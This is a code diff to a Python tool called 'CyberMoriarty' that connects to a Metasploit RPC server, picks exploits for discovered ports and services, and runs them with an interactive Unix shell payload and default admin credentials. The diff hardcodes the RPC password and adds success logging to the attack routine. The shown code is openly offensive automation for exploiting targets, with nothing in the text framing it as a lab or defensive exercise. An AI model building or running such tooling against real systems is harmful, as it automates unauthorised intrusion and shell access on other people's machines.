@@ -21,7 +21,7 @@ class CyberMoriarty:
         self.target = None
         self.threat_intelligence = ThreatIntelligence()
         try:
-            self.msfrpc_client = MsfRpcClient('your_password', ssl=False)
+            self.msfrpc_client = MsfRpcClient('CyberMoriarty', ssl=False)
             print("Connected to Metasploit RPC server.")
         except MsfRpcError as e:
             print(f"Failed to connect to Metasploit RPC server: {e}")
@@ -101,14 +101,23 @@ class CyberMoriarty:
                     exploit['USERNAME'] = 'admin'  # Replace with valid username
                     exploit['PASSWORD'] = 'password'  # Replace with valid password
                     payload = self.msfrpc_client.modules.use('payload', 'cmd/unix/interact')
-                    exploit.execute(payload=payload)
-                    
+                    result = exploit.execute(payload=payload)
+
+                    # Checking if the result is a boolean and logging accordingly
+                    if isinstance(result, bool):
+                        if result:
+                            status = 'Attack executed'
+                        else:
+                            status = 'Attack failed'
+                    else:
+                        status = 'Unknown response'
+
                     self.attack_log.append({
                         'port': suggestion['port'],
                         'service': suggestion['service'],
-                        'status': 'Attack executed'
+                        'status': status
                     })
-                    print(f"Attack executed on {suggestion['service']}:{suggestion['port']}")
+                    print(f"{status} on {suggestion['service']}:{suggestion['port']}")
                 except Exception as e:
                     print(f"Error executing exploit {suggestion['exploit']}: {str(e)}")
                     self.attack_log.append({
@@ -148,4 +157,5 @@ if __name__ == "__main__":
     tool.suggest_exploits()
     tool.execute_attack()
     tool.generate_report()
+
 
